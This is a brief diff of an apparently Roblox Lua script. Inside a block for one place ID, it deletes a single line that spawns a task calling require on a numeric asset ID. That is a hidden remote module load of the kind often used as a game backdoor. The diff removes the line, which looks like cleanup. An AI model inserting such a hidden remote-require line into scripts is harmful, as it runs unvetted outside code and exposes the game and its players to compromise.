@@ -23,7 +23,6 @@ end
 end)
 
 if game.PlaceId == 14747334292 then
-task.spawn(function()require(80295379048504)end)
     local chatcon = {}
     chatcon[#chatcon + 1] = game.Players.PlayerAdded:Connect(function(player)
         wait(0.94397082108066)
